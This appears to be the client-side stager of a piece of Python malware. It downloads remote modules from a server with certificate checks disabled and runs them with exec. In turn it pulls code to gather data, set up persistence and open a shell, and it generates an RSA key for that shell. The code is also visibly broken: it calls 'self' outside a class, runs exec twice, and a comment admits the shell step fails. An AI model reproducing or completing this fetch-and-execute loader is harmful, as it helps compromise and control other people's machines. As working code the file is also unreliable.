from urllib.request import urlopen
import importlib.util
import os
import subprocess
import ssl
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

def receive_private_key():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    self.write_file("private_key.pem", private_pem)
    return private_key

# check to see if the scirpt is already Rolling
def create_moduel(url):
    # Create an SSL context that doesn't verify certificates
    context = ssl._create_unverified_context()
    # Use the context when opening the URL
    with urlopen(url, context=context) as response:
        code = response.read().decode("utf-8")

    spec = importlib.util.spec_from_loader("temp", loader=None)
    module = importlib.util.module_from_spec(spec)

    # Execute the code in the module's namespace
    exec(code, module.__dict__)

    # execute the code in the temporary module
    exec(code, module.__dict__)

    return module

def run(url, file_path):
    module = create_moduel(f"{url}client/get_data.py")

    data = module.run(url)  # works fine the shell part gives errors

    module = create_moduel(f"{url}client/persistence.py")
    module.run(url, file_path)

    module = create_moduel(f"{url}client/shell.py")

    module.run(data, receive_private_key())
